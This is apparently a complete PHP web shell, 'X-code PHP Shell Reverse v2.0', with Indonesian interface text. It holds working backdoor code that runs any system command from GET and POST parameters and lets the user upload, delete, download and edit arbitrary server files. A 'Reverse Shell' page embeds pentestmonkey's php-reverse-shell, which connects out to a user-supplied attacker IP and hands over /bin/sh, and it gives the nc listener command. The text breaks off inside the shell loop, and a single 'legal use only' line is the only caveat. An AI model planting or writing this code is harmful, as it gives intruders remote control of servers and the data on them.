<!DOCTYPE html>
<html>
<head>
<title>X-code PHP Shell Reverse v2.0 - xcode.or.id - Full Features [GNU GPL v2]</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html{height:100%}
body{background-color:#0a0e17;display:flex;flex-direction:column;margin:0;height:inherit;color:#e8edf5;font-family:'Segoe UI',sans-serif;font-size:1em}

.navbar{background:#131d2e;padding:0.8rem 2rem;border-bottom:1px solid #2a3a55;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;position:sticky;top:0;z-index:1000}
.navbar-brand{display:flex;align-items:center;gap:0.8rem;font-size:1.2rem;font-weight:700;color:#00d4ff;text-decoration:none}
.navbar-brand img{height:40px;width:auto;transition:transform 0.3s}
.navbar-brand img:hover{transform:scale(1.1)}
.navbar-menu{display:flex;flex-wrap:wrap;gap:0.5rem}
.nav-link{color:#8899bb;text-decoration:none;padding:0.5rem 1rem;border-radius:8px;transition:.3s;font-size:.9rem;display:flex;align-items:center;gap:.5rem}
.nav-link:hover,.nav-link.active{background:#00d4ff;color:#0a0e17}

.container{flex:1;max-width:1400px;margin:0 auto;padding:1.5rem;width:100%}

.card{background:#1a273a;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;border:1px solid #2a3a55;box-shadow:0 8px 32px rgba(0,0,0,0.4);transition:.3s}
.card:hover{border-color:#00d4ff}
.card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid #2a3a55;flex-wrap:wrap;gap:.5rem}
.card-title{font-size:1.2rem;font-weight:600;display:flex;align-items:center;gap:.5rem}
.card-title i{color:#00d4ff}

.form-control{width:100%;padding:.7rem 1rem;background:#0f1a2b;border:1px solid #2a3a55;border-radius:8px;color:#e8edf5;font-size:.95rem;transition:.3s}
.form-control:focus{outline:none;border-color:#00d4ff;box-shadow:0 0 0 3px rgba(0,212,255,0.1)}
.form-group{margin-bottom:1rem}
.form-group label{display:block;margin-bottom:.5rem;color:#8899bb;font-size:.9rem;font-weight:500}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:1rem}

.btn{padding:.7rem 1.5rem;border:none;border-radius:8px;font-weight:600;cursor:pointer;transition:.3s;display:inline-flex;align-items:center;gap:.5rem;font-size:.95rem}
.btn-primary{background:#00d4ff;color:#0a0e17}
.btn-primary:hover{background:#00b8d4;transform:translateY(-2px);box-shadow:0 4px 15px rgba(0,212,255,0.3)}
.btn-danger{background:#ff5252;color:#fff}
.btn-danger:hover{background:#ff1744;transform:translateY(-2px)}
.btn-success{background:#00e676;color:#0a0e17}
.btn-outline{background:transparent;border:1px solid #2a3a55;color:#8899bb}
.btn-outline:hover{border-color:#00d4ff;color:#00d4ff;background:rgba(0,212,255,0.05)}

.terminal{background:#0a0e17;border-radius:12px;padding:1.2rem;font-family:'Courier New',monospace;font-size:.9rem;color:#00e676;overflow-x:auto;white-space:pre-wrap;max-height:500px;overflow-y:auto;border:1px solid #2a3a55;line-height:1.6}
.terminal .prompt{color:#00d4ff}
.terminal .error{color:#ff5252}

.shell-input-container{display:flex;align-items:center;background:#0f1a2b;border:1px solid #2a3a55;border-radius:8px;padding:.3rem .5rem;margin-top:1rem;transition:.3s}
.shell-input-container:focus-within{border-color:#00d4ff;box-shadow:0 0 0 3px rgba(0,212,255,0.1)}
.shell-prompt{color:#00d4ff;font-family:'Courier New',monospace;font-weight:600;padding:.5rem}
.shell-input{flex:1;background:transparent;border:none;padding:.5rem;color:#e8edf5;font-family:'Courier New',monospace;outline:none}
.shell-send-btn{background:#00d4ff;color:#0a0e17;border:none;padding:.3rem .8rem;border-radius:6px;cursor:pointer;font-weight:600;transition:.3s}
.shell-send-btn:hover{background:#00b8d4;transform:scale(1.05)}

.quick-commands{display:flex;flex-wrap:wrap;gap:.5rem;margin-top:.5rem}
.quick-command{background:#0f1a2b;border:1px solid #2a3a55;border-radius:6px;padding:.3rem .8rem;color:#8899bb;cursor:pointer;font-family:'Courier New',monospace;font-size:.8rem;transition:.3s}
.quick-command:hover{border-color:#00d4ff;color:#00d4ff;background:rgba(0,212,255,0.05)}

.file-manager{overflow-x:auto}
.file-table{width:100%;border-collapse:collapse;font-size:.9rem}
.file-table th{text-align:left;padding:.7rem .5rem;color:#8899bb;border-bottom:2px solid #2a3a55;font-weight:600}
.file-table td{padding:.5rem;border-bottom:1px solid #2a3a55}
.file-table tr:hover{background:rgba(0,212,255,0.05)}
.file-icon{margin-right:.5rem}
.file-link{color:#e8edf5;text-decoration:none;transition:.3s}
.file-link:hover{color:#00d4ff}

.code-block{background:#0a0e17;padding:1rem;border-radius:6px;border:1px solid #2a3a55;font-family:'Courier New',monospace;font-size:.85rem;color:#00e676;overflow-x:auto;margin-top:.5rem}

.alert{padding:1rem;border-radius:8px;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
.alert-success{background:rgba(0,230,118,.1);border:1px solid #00e676;color:#00e676}
.alert-danger{background:rgba(255,82,82,.1);border:1px solid #ff5252;color:#ff5252}
.alert-warning{background:rgba(255,171,64,.1);border:1px solid #ffab40;color:#ffab40}

.info-box{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;margin-bottom:1rem}
.info-item{background:#0f1a2b;padding:1rem;border-radius:8px;border:1px solid #2a3a55}
.info-item label{color:#8899bb;font-size:.8rem;text-transform:uppercase;letter-spacing:.5px}
.info-item .value{font-size:1.1rem;font-weight:600;margin-top:.3rem}

.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem;margin-top:1rem}
.feature-card{background:#0f1a2b;padding:1.5rem;border-radius:12px;border:1px solid #2a3a55;text-align:center;transition:.3s;cursor:pointer}
.feature-card:hover{border-color:#00d4ff;transform:translateY(-5px);box-shadow:0 8px 32px rgba(0,0,0,0.4)}
.feature-card i{font-size:2.5rem;margin-bottom:.5rem}
.feature-card h3{margin-bottom:.3rem}
.feature-card p{color:#8899bb;font-size:.9rem}

.status-badge{display:inline-block;padding:.3rem .8rem;border-radius:20px;font-size:.8rem;font-weight:600}
.status-badge.active{background:#00e676;color:#0a0e17;animation:pulse 2s infinite}
.status-badge.inactive{background:#ff5252;color:#fff}
.status-badge.ready{background:#ffab40;color:#0a0e17}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}

.footer{text-align:center;padding:1.5rem;color:#8899bb;font-size:.8rem;border-top:1px solid #2a3a55}

pre{background:#0a0e17;padding:10px;border-radius:5px;color:#00ff00;font-family:monospace;max-height:400px;overflow:auto;white-space:pre-wrap;border:1px solid #2a3a55}

@media(max-width:768px){
.navbar{padding:.8rem 1rem}
.navbar-brand{font-size:1rem}
.navbar-brand img{height:30px}
.nav-link{padding:.4rem .7rem;font-size:.8rem}
.container{padding:.8rem}
.card{padding:1rem}
.form-row{grid-template-columns:1fr}
.terminal{font-size:.8rem;max-height:300px}
}
@media(max-width:480px){
.navbar-menu{gap:.3rem}
.nav-link{padding:.3rem .5rem;font-size:.7rem}
.nav-link span{display:none}
.btn{padding:.5rem 1rem;font-size:.85rem}
}
</style>
</head>
<body>

<?php
// Configuration
$VERSION = "2.0";
$current_page = isset($_GET['page']) ? $_GET['page'] : 'home';
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// System Info
function get_system_info() {
    $info = [];
    $info['os'] = php_uname('s') . ' ' . php_uname('r');
    $info['hostname'] = gethostname();
    $info['user'] = get_current_user();
    $info['php_version'] = phpversion();
    $info['server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $info['ip'] = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    return $info;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

$sys_info = get_system_info();

// Handle command via GET
if (!empty($_GET['cmd'])) {
    echo "<div class='terminal'>";
    echo "<span class='prompt'>$</span> " . htmlspecialchars($_GET['cmd']) . "\n\n";
    system($_GET['cmd'] . ' 2>&1');
    echo "</div>";
    exit;
}

// Handle shell via POST
if (isset($_POST['x']) && isset($_GET['shell'])) {
    $cmd = $_POST['x'];
    echo '<div style="margin-bottom:1rem; color:#8899bb;">Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home</div>';
    echo '<form action="?page=shell" method="POST" style="margin-bottom:1rem; display:flex; gap:0.5rem; flex-wrap:wrap;">';
    echo '<input type="text" name="x" class="form-control" style="flex:1; min-width:200px;" value="' . htmlspecialchars($cmd) . '">';
    echo '<button type="submit" class="btn btn-primary"><i class="fas fa-play"></i> Execute</button>';
    echo '</form>';
    echo '<div class="terminal">';
    echo '<span class="prompt">$</span> ' . htmlspecialchars($cmd) . "\n\n";
    system($cmd . ' 2>&1');
    echo '</div>';
    exit;
}

// Handle file upload
if (isset($_GET['upload']) && isset($_FILES['file'])) {
    $target_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $target_file = $target_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $upload_msg = "<div class='alert alert-success'><i class='fas fa-check-circle'></i> File berhasil diupload</div>";
    } else {
        $upload_msg = "<div class='alert alert-danger'><i class='fas fa-exclamation-circle'></i> Gagal upload file</div>";
    }
}

// Handle file delete
if (isset($_GET['delete']) && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (unlink($file)) {
        $delete_msg = "<div class='alert alert-success'><i class='fas fa-check-circle'></i> File berhasil dihapus</div>";
    } else {
        $delete_msg = "<div class='alert alert-danger'><i class='fas fa-exclamation-circle'></i> Gagal menghapus file</div>";
    }
}

// Handle file download
if (isset($_GET['download']) && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Handle directory change
if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
    chdir($_GET['cd']);
    header('Location: ?page=files&dir=' . urlencode(getcwd()));
    exit;
}
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Handle file save
if (isset($_GET['save']) && isset($_POST['content'])) {
    $save_file = $_GET['save'];
    if (file_put_contents($save_file, $_POST['content'])) {
        $save_msg = "<div class='alert alert-success'><i class='fas fa-check-circle'></i> File berhasil disimpan</div>";
    }
}
?>

<!-- Navbar -->
<nav class="navbar">
    <a href="?page=home" class="navbar-brand">
        <img src="https://xcode.or.id/04_small-logo.png" alt="X-Code Logo" onerror="this.style.display='none'">
        <span>X-Shell Pro</span>
        <small style="font-size:0.6rem; color:#8899bb;">v<?= $VERSION ?></small>
    </a>
    <div class="navbar-menu">
        <a href="?page=home" class="nav-link <?= $current_page == 'home' ? 'active' : '' ?>">
            <i class="fas fa-home"></i> <span>Home</span>
        </a>
        <a href="?page=shell" class="nav-link <?= $current_page == 'shell' ? 'active' : '' ?>">
            <i class="fas fa-terminal"></i> <span>Shell</span>
        </a>
        <a href="?page=files" class="nav-link <?= $current_page == 'files' ? 'active' : '' ?>">
            <i class="fas fa-folder"></i> <span>Files</span>
        </a>
        <a href="?page=reverse" class="nav-link <?= $current_page == 'reverse' ? 'active' : '' ?>">
            <i class="fas fa-share-alt"></i> <span>Reverse</span>
        </a>
    </div>
</nav>

<div class="container">

<?php if ($current_page == 'home' || empty($_GET['page'])): ?>
    <!-- HOME PAGE -->
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-home"></i> Dashboard</h2>
            <span class="status-badge active"><i class="fas fa-circle"></i> Ready</span>
        </div>
        <div class="info-box">
            <div class="info-item"><label>OS</label><div class="value"><i class="fas fa-linux"></i> <?= htmlspecialchars($sys_info['os']) ?></div></div>
            <div class="info-item"><label>Hostname</label><div class="value"><i class="fas fa-server"></i> <?= htmlspecialchars($sys_info['hostname']) ?></div></div>
            <div class="info-item"><label>User</label><div class="value"><i class="fas fa-user"></i> <?= htmlspecialchars($sys_info['user']) ?></div></div>
            <div class="info-item"><label>PHP Version</label><div class="value"><i class="fab fa-php"></i> <?= htmlspecialchars($sys_info['php_version']) ?></div></div>
            <div class="info-item"><label>Server</label><div class="value"><i class="fas fa-cloud"></i> <?= htmlspecialchars($sys_info['server']) ?></div></div>
            <div class="info-item"><label>IP Address</label><div class="value"><i class="fas fa-network-wired"></i> <?= htmlspecialchars($sys_info['ip']) ?></div></div>
        </div>
        <div class="feature-grid">
            <div class="feature-card" onclick="window.location='?page=shell'">
                <i class="fas fa-terminal" style="color:#00d4ff;"></i>
                <h3>Command Shell</h3>
                <p>Execute system commands</p>
            </div>
            <div class="feature-card" onclick="window.location='?page=files'">
                <i class="fas fa-folder-open" style="color:#00e676;"></i>
                <h3>File Manager</h3>
                <p>Browse, upload, edit files</p>
            </div>
            <div class="feature-card" onclick="window.location='?page=reverse'">
                <i class="fas fa-share-alt" style="color:#ff5252;"></i>
                <h3>Reverse Shell</h3>
                <p>Connect back to attacker</p>
            </div>
        </div>
        <div style="text-align:center; margin-top:1rem; padding-top:1rem; border-top:1px solid #2a3a55;">
            <a href="https://xcode.or.id" target="_blank" style="color:#00d4ff; text-decoration:none;">
                <i class="fas fa-external-link-alt"></i> Dibangun Oleh Kurniawan X-code dengan pengembangannya dilakukan oleh tim di https://github.com/kurniawandata/xcodephpshell lalu pengembangan berikutnya menggunakan AI. Support PHP 8.5. Lisensi GNU GPL v2.
            </a>
        </div>
    </div>

    <!-- INTERACTIVE SHELL -->
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-terminal"></i> Interactive Shell</h2>
            <div style="display:flex; align-items:center; gap:0.5rem; flex-wrap:wrap;">
                <span style="color:#8899bb; font-size:0.8rem;">
                    <i class="fas fa-user"></i> <?= htmlspecialchars($sys_info['user']) ?>
                </span>
                <span style="color:#8899bb; font-size:0.8rem;">
                    <i class="fas fa-folder"></i> <?= htmlspecialchars(getcwd()) ?>
                </span>
            </div>
        </div>
        <div class="terminal" id="shellOutput">
            <div>X-Shell Pro v<?= $VERSION ?> - Interactive Shell</div>
            <div>Current directory: <?= htmlspecialchars(getcwd()) ?></div>
            <div>Type your command below</div>
            <br>
            <?php if (isset($_POST['home_cmd'])): 
                $cmd = $_POST['home_cmd'];
                echo "<span class='prompt'>$</span> " . htmlspecialchars($cmd) . "\n\n";
                system($cmd . ' 2>&1');
                echo "\n";
            endif; ?>
        </div>
        <form method="POST">
            <div class="shell-input-container">
                <span class="shell-prompt"><i class="fas fa-chevron-right"></i> $</span>
                <input type="text" name="home_cmd" class="shell-input" placeholder="Type your command here..." autofocus>
                <button type="submit" class="shell-send-btn"><i class="fas fa-arrow-right"></i></button>
            </div>
        </form>
        <div class="quick-commands">
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='ls -la'; this.closest('.card').querySelector('form').submit();">ls -la</span>
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='pwd'; this.closest('.card').querySelector('form').submit();">pwd</span>
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='whoami'; this.closest('.card').querySelector('form').submit();">whoami</span>
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='id'; this.closest('.card').querySelector('form').submit();">id</span>
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='uname -a'; this.closest('.card').querySelector('form').submit();">uname -a</span>
            <span class="quick-command" onclick="document.querySelector('input[name=home_cmd]').value='php -v'; this.closest('.card').querySelector('form').submit();">php -v</span>
        </div>
    </div>

<?php elseif ($current_page == 'shell'): ?>
    <!-- SHELL PAGE -->
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-terminal"></i> Command Shell</h2>
            <div style="display:flex; align-items:center; gap:0.5rem; flex-wrap:wrap;">
                <span style="color:#8899bb; font-size:0.8rem;">
                    <i class="fas fa-user"></i> <?= htmlspecialchars($sys_info['user']) ?>
                </span>
                <span style="color:#8899bb; font-size:0.8rem;">
                    <i class="fas fa-folder"></i> <?= htmlspecialchars(getcwd()) ?>
                </span>
            </div>
        </div>
        <?php if (!isset($_POST['x'])): ?>
        <div style="margin-bottom:1rem; color:#8899bb;">Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home</div>
        <?php endif; ?>
        <form action="?page=shell" method="POST" style="display:flex; gap:0.5rem; flex-wrap:wrap; margin-bottom:1rem;">
            <input type="text" name="x" class="form-control" style="flex:1; min-width:200px;" value="<?= isset($_POST['x']) ? htmlspecialchars($_POST['x']) : 'ls -l' ?>">
            <button type="submit" class="btn btn-primary"><i class="fas fa-play"></i> Execute</button>
        </form>
        <?php if (isset($_POST['x'])): ?>
        <div class="terminal">
            <span class="prompt">$</span> <?= htmlspecialchars($_POST['x']) ?><br><br>
            <?php system($_POST['x'] . ' 2>&1'); ?>
        </div>
        <?php else: ?>
        <div class="terminal" style="color:#8899bb;"><span class="prompt">$</span> Type a command above and click Execute</div>
        <?php endif; ?>
        <div class="quick-commands">
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='ls -la'; this.closest('.card').querySelector('form').submit();">ls -la</span>
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='pwd'; this.closest('.card').querySelector('form').submit();">pwd</span>
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='whoami'; this.closest('.card').querySelector('form').submit();">whoami</span>
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='id'; this.closest('.card').querySelector('form').submit();">id</span>
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='uname -a'; this.closest('.card').querySelector('form').submit();">uname -a</span>
            <span class="quick-command" onclick="document.querySelector('input[name=x]').value='php -v'; this.closest('.card').querySelector('form').submit();">php -v</span>
        </div>
    </div>

<?php elseif ($current_page == 'files'): ?>
    <!-- FILES PAGE -->
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-folder"></i> File Manager</h2>
            <div style="display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center;">
                <button class="btn btn-primary" onclick="document.getElementById('uploadForm').style.display='block'"><i class="fas fa-upload"></i> Upload</button>
                <span style="color:#8899bb; font-size:0.9rem;"><i class="fas fa-folder"></i> <?= htmlspecialchars($current_dir) ?></span>
            </div>
        </div>
        <?= $upload_msg ?? '' ?>
        <?= $delete_msg ?? '' ?>
        <?= $save_msg ?? '' ?>
        <div id="uploadForm" style="display:none; margin-bottom:1rem;">
            <form method="POST" enctype="multipart/form-data" action="?page=files&upload=true&dir=<?= urlencode($current_dir) ?>">
                <div style="display:flex; gap:0.5rem; flex-wrap:wrap;">
                    <input type="file" name="file" class="form-control" style="flex:1; min-width:200px;" required>
                    <button type="submit" class="btn btn-success"><i class="fas fa-upload"></i> Upload</button>
                    <button type="button" class="btn btn-outline" onclick="document.getElementById('uploadForm').style.display='none'"><i class="fas fa-times"></i> Cancel</button>
                </div>
            </form>
        </div>
        <div style="margin-bottom:1rem; display:flex; gap:0.5rem; flex-wrap:wrap;">
            <button class="btn btn-outline" onclick="window.location='?page=files&dir=/'"><i class="fas fa-home"></i> Root</button>
            <button class="btn btn-outline" onclick="window.location='?page=files&dir=<?= urlencode(getcwd()) ?>'"><i class="fas fa-redo"></i> Refresh</button>
            <button class="btn btn-outline" onclick="window.location='?page=files&dir=<?= urlencode(dirname($current_dir)) ?>'"><i class="fas fa-arrow-up"></i> Parent</button>
        </div>
        <div class="file-manager">
            <table class="file-table">
                <thead><tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr></thead>
                <tbody>
                <?php
                $files = scandir($current_dir);
                foreach ($files as $file):
                    $filepath = $current_dir . '/' . $file;
                    if ($file == '.' || $file == '..') continue;
                    $is_dir = is_dir($filepath);
                    $size = $is_dir ? 'Folder' : formatSize(filesize($filepath));
                    $perms = substr(sprintf('%o', fileperms($filepath)), -4);
                    $modified = date('Y-m-d H:i:s', filemtime($filepath));
                    $icon = $is_dir ? 'fa-folder' : 'fa-file';
                    $icon_color = $is_dir ? '#ffab40' : '#00d4ff';
                ?>
                <tr>
                    <td>
                        <i class="fas <?= $icon ?> file-icon" style="color:<?= $icon_color ?>"></i>
                        <?php if ($is_dir): ?>
                            <a href="?page=files&cd=<?= urlencode($filepath) ?>" class="file-link"><?= htmlspecialchars($file) ?></a>
                        <?php else: ?>
                            <span><?= htmlspecialchars($file) ?></span>
                        <?php endif; ?>
                    </td>
                    <td><?= $size ?></td>
                    <td><?= $perms ?></td>
                    <td><?= $modified ?></td>
                    <td>
                        <div style="display:flex; gap:0.3rem; flex-wrap:wrap;">
                            <?php if (!$is_dir): ?>
                                <a href="?page=files&download=true&file=<?= urlencode($filepath) ?>" class="btn btn-outline" style="padding:0.2rem 0.5rem; font-size:0.8rem;" title="Download"><i class="fas fa-download"></i></a>
                                <a href="?page=files&delete=true&file=<?= urlencode($filepath) ?>" class="btn btn-outline" style="padding:0.2rem 0.5rem; font-size:0.8rem; color:#ff5252;" title="Delete" onclick="return confirm('Hapus file ini?')"><i class="fas fa-trash"></i></a>
                                <a href="?page=files&edit=<?= urlencode($filepath) ?>" class="btn btn-outline" style="padding:0.2rem 0.5rem; font-size:0.8rem;" title="Edit"><i class="fas fa-edit"></i></a>
                            <?php endif; ?>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <?php if (isset($_GET['edit'])): 
        $edit_file = $_GET['edit'];
        if (file_exists($edit_file) && is_file($edit_file)):
    ?>
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-edit"></i> Edit File: <?= basename($edit_file) ?></h2>
        </div>
        <form method="POST" action="?page=files&save=<?= urlencode($edit_file) ?>">
            <textarea class="form-control" name="content" rows="20" style="font-family:'Courier New',monospace;font-size:.9rem;background:#0a0e17;"><?= htmlspecialchars(file_get_contents($edit_file)) ?></textarea>
            <div style="margin-top:1rem; display:flex; gap:0.5rem; flex-wrap:wrap;">
                <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> Save</button>
                <button type="button" class="btn btn-outline" onclick="window.location='?page=files'"><i class="fas fa-times"></i> Cancel</button>
            </div>
        </form>
    </div>
    <?php endif; endif; ?>

<?php elseif ($current_page == 'reverse'): ?>
    <!-- REVERSE SHELL PAGE -->
    <div class="card">
        <div class="card-header">
            <h2 class="card-title"><i class="fas fa-share-alt"></i> Reverse Shell</h2>
            <span class="status-badge ready"><i class="fas fa-circle"></i> Ready</span>
        </div>
        <div class="alert alert-warning">
            <i class="fas fa-exclamation-triangle"></i>
            <strong>Legal Use Only:</strong> Reverse shell untuk riset dan pentest legal.
        </div>
        
        <form method="GET" action="">
            <input type="hidden" name="page" value="reverse">
            <div class="form-group">
                <label><i class="fas fa-network-wired"></i> IP Address</label>
                <input type="text" name="reverse" class="form-control" placeholder="192.168.1.100" value="<?= isset($_GET['reverse']) ? htmlspecialchars($_GET['reverse']) : '' ?>" required>
                <small style="color:#8899bb;">IP Address yang akan menerima koneksi reverse shell</small>
            </div>
            <div class="form-group">
                <label><i class="fas fa-plug"></i> Port</label>
                <input type="number" name="port" class="form-control" placeholder="1337" value="<?= isset($_GET['port']) ? htmlspecialchars($_GET['port']) : '1337' ?>" min="1" max="65535" required>
                <small style="color:#8899bb;">Port yang digunakan untuk koneksi (default: 1337)</small>
            </div>
            <button type="submit" class="btn btn-danger" style="width:100%;">
                <i class="fas fa-share-alt"></i> Start Reverse Shell
            </button>
        </form>

        <?php if (isset($_GET['reverse']) && isset($_GET['port'])): 
            $ip = htmlspecialchars($_GET['reverse']);
            $port = intval($_GET['port']);
        ?>
        <div style="margin-top:1.5rem; padding:1rem; background:#0a0e17; border-radius:8px; border:1px solid #2a3a55;">
            <div class="alert alert-success">
                <i class="fas fa-check-circle"></i> Reverse shell akan terhubung ke <?= $ip ?>:<?= $port ?>
            </div>
            <div style="color:#8899bb; font-size:0.9rem; margin-bottom:0.5rem;">
                <strong>1. Jalankan listener di attacker:</strong>
            </div>
            <div class="code-block">nc -lvnp <?= $port ?></div>
            <div style="color:#8899bb; font-size:0.9rem; margin-top:1rem; margin-bottom:0.5rem;">
                <strong>2. Akses URL berikut untuk menjalankan reverse shell:</strong>
            </div>
            <div class="code-block" style="color:#00d4ff; word-break:break-all;">
                <?php 
                $url = 'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . 
                       ($_SERVER['PHP_SELF'] ?? '') . 
                       '?reverse=' . urlencode($_GET['reverse']) . '&port=' . $port;
                echo htmlspecialchars($url);
                ?>
            </div>
            <div style="color:#ffab40; font-size:0.85rem; margin-top:0.5rem;">
                <i class="fas fa-info-circle"></i> Setelah akses URL di atas, shell akan terkoneksi ke listener
            </div>
        </div>
        <?php endif; ?>
    </div>
<?php endif; ?>

</div>

<!-- ============================================================ -->
<!-- REVERSE SHELL - KODE ASLI 100% TIDAK DIRUBAH                  -->
<!-- LISENSI GPL v2, KOMENTAR, SEMUA SAMA PERSIS                  -->
<!-- ============================================================ -->
<?php
if (!empty($_GET['reverse'])) { 
    echo "<pre>"; 
} 
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = $_GET["reverse"];
$port = 1337;     
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
